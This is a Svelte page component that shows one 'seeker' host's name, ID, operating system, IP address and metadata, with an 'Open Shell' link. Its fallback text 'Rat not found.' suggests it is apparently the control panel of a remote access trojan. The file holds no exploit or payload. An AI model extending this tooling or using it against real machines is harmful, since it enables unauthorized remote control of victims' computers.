<script lang="ts">
	import { page } from '$app/stores';
	import { onMount } from 'svelte';
	import type { Seeker } from '$lib/types';

	let seeker: Seeker | null = null;

	async function setSeeker(id: string) {
		const res = await fetch(`/api/seekers`);
		if (!res.ok) {
			console.error('Fetch error:', res.status, res.statusText);
			return;
		}
		const seekers: Record<string, Seeker> = await res.json();
		seeker = seekers[id] ?? null;
	}

	onMount(() => {
		const id = $page.params.id;
		setSeeker(id);

		const ws = new WebSocket(`ws://localhost:8080/ws/frontend/${id}`);
		ws.onmessage = async (event) => {
			console.log('Message from server:', event.data);
			try {
				const message = JSON.parse(event.data);

				switch (message.type) {
					default:
						console.warn('Unknown message type:', message.type);
				}
			} catch (err) {
				console.error('Failed to parse message:', err);
			}
		};
		return () => ws.close();
	});
</script>


{#if seeker}
	<div class="p-4 bg-gray-800 rounded">
		<h2 class="text-2xl mb-4">{seeker.name}</h2>
		<p><strong>ID:</strong> {seeker.id}</p>
		<p><strong>OS:</strong> {seeker.os}</p>
		<p><strong>IP:</strong> {seeker.ip}</p>
		<div class="mt-4">
			<a href="/{seeker.id}/shell" class="px-4 py-2 bg-blue-600 rounded hover:bg-blue-500">Open Shell</a>
		</div>
		<h3 class="mt-4 text-xl">Metadata</h3>
		<pre class="bg-gray-900 p-4 rounded">{JSON.stringify(seeker.metadata, null, 2)}</pre>
	</div>
{:else}
	<p>Rat not found.</p>
{/if}